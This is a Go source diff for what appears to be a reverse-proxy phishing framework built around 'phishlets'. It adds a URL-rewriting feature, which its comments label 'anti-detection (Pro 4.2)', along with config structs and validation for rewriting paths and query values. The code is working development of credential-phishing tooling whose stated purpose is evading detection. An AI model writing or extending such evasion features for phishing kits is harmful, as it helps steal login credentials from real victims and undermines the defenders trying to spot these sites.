@@ -98,6 +98,29 @@ type JsInject struct {
 	location        string           `mapstructure:"location"` // "head", "body_top", "body_bottom" (default: "body_bottom")
 }
 
+// URL Rewriting structures for anti-detection (Pro 4.2)
+type RewriteQuery struct {
+	key   string `mapstructure:"key"`
+	value string `mapstructure:"value"` // must contain {id} placeholder
+}
+
+type RewriteUrlTrigger struct {
+	domains []string         `mapstructure:"domains"`
+	paths   []*regexp.Regexp `mapstructure:"paths"`
+}
+
+type RewriteUrlRewrite struct {
+	path         string         `mapstructure:"path"`
+	query        []RewriteQuery `mapstructure:"query"`
+	exclude_keys []string       `mapstructure:"exclude_keys"`
+}
+
+type RewriteUrl struct {
+	id      string            `mapstructure:"id"`
+	trigger RewriteUrlTrigger `mapstructure:"trigger"`
+	rewrite RewriteUrlRewrite `mapstructure:"rewrite"`
+}
+
 type Intercept struct {
 	domain      string         `mapstructure:"domain"`
 	path        *regexp.Regexp `mapstructure:"path"`
@@ -129,6 +152,7 @@ type Phishlet struct {
 	forcePost        []ForcePost
 	login            LoginUrl
 	js_inject        []JsInject
+	rewrite_urls     []RewriteUrl // URL rewriting for anti-detection (Pro 4.2)
 	intercept        []Intercept
 	puppet           *PuppetConfig
 	customParams     map[string]string
@@ -221,6 +245,28 @@ type ConfigIntercept struct {
 	Mime       *string `mapstructure:"mime"`
 }
 
+// Config structures for URL rewriting (Pro 4.2)
+type ConfigRewriteQuery struct {
+	Key   *string `mapstructure:"key"`
+	Value *string `mapstructure:"value"`
+}
+
+type ConfigRewriteUrlTrigger struct {
+	Domains *[]string `mapstructure:"domains"`
+	Paths   *[]string `mapstructure:"paths"`
+}
+
+type ConfigRewriteUrlRewrite struct {
+	Path        *string               `mapstructure:"path"`
+	Query       *[]ConfigRewriteQuery `mapstructure:"query"`
+	ExcludeKeys *[]string             `mapstructure:"exclude_keys"`
+}
+
+type ConfigRewriteUrl struct {
+	Trigger *ConfigRewriteUrlTrigger `mapstructure:"trigger"`
+	Rewrite *ConfigRewriteUrlRewrite `mapstructure:"rewrite"`
+}
+
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
 	RedirectUrl string             `mapstructure:"redirect_url"`
@@ -234,6 +280,7 @@ type ConfigPhishlet struct {
 	LandingPath *[]string          `mapstructure:"landing_path"`
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
+	RewriteUrls *[]ConfigRewriteUrl `mapstructure:"rewrite_urls"` // Pro 4.2
 	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
 	Puppet      *PuppetConfig      `mapstructure:"puppet"`
 }
@@ -491,6 +538,42 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				location = *js.Location
 			}
 			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script), location)
+			if err != nil {
+				return err
+			}
+		}
+	}
+	if fp.RewriteUrls != nil {
+		for _, rw := range *fp.RewriteUrls {
+			if rw.Trigger == nil {
+				return fmt.Errorf("rewrite_urls: missing `trigger` section")
+			}
+			if rw.Trigger.Domains == nil {
+				return fmt.Errorf("rewrite_urls: missing `trigger.domains` field")
+			}
+			if rw.Trigger.Paths == nil {
+				return fmt.Errorf("rewrite_urls: missing `trigger.paths` field")
+			}
+			if rw.Rewrite == nil {
+				return fmt.Errorf("rewrite_urls: missing `rewrite` section")
+			}
+			if rw.Rewrite.Path == nil {
+				return fmt.Errorf("rewrite_urls: missing `rewrite.path` field")
+			}
+
+			// Validate {id} placeholder in query values
+			if rw.Rewrite.Query != nil {
+				for _, q := range *rw.Rewrite.Query {
+					if q.Key == nil || q.Value == nil {
+						return fmt.Errorf("rewrite_urls: query must have both `key` and `value` fields")
+					}
+					if !strings.Contains(*q.Value, "{id}") {
+						return fmt.Errorf("rewrite_urls: query value must contain {id} placeholder: %s", *q.Value)
+					}
+				}
+			}
+
+			err := p.addRewriteUrl(*rw.Trigger.Domains, *rw.Trigger.Paths, *rw.Rewrite.Path, rw.Rewrite.Query, rw.Rewrite.ExcludeKeys)
 			if err != nil {
 				return err
 			}
